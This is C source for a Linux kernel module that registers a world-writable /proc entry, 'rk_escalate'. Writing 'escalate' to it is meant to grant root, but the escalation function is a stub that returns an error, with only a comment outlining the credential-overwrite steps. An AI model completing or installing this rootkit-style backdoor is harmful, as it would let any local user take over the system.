// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/uidgid.h>

static struct proc_dir_entry *entry;

static int escalate_to_root(void)
{
	/* Prepare mutable credentials, set every UID/GID role, then commit. */
	return -EOPNOTSUPP;
}

static int info_show(struct seq_file *m, void *v)
{
	const struct cred *cred = current_cred();

	seq_printf(m, "uid=%u\n", from_kuid(&init_user_ns, cred->uid));
	return 0;
}

static int info_open(struct inode *inode, struct file *file)
{
	return single_open(file, info_show, NULL);
}

static ssize_t info_write(struct file *file, const char __user *buffer,
			  size_t count, loff_t *position)
{
	char buf[16];
	size_t len = count;

	if (!count || count >= sizeof(buf))
		return -EINVAL;

	if (copy_from_user(buf, buffer, len))
		return -EFAULT;
	if (memchr(buf, '\0', len))
		return -EINVAL;
	buf[len] = '\0';

	if (sysfs_streq(buf, "escalate")) {
		int ret = escalate_to_root();

		if (ret)
			return ret;
	} else {
		return -EINVAL;
	}

	return count;
}

static const struct proc_ops inspect_proc_ops = {
	.proc_open    = info_open,
	.proc_read    = seq_read,
	.proc_lseek   = seq_lseek,
	.proc_release = single_release,
	.proc_write   = info_write,
};

static int __init inspect_init(void)
{
	entry = proc_create("rk_escalate", 0666, NULL, &inspect_proc_ops);
	if (!entry)
		return -ENOMEM;

	pr_info("rk: introspection ready\n");
	return 0;
}

static void __exit inspect_exit(void)
{
	proc_remove(entry);
}

module_init(inspect_init);
module_exit(inspect_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Credential escalation to root");
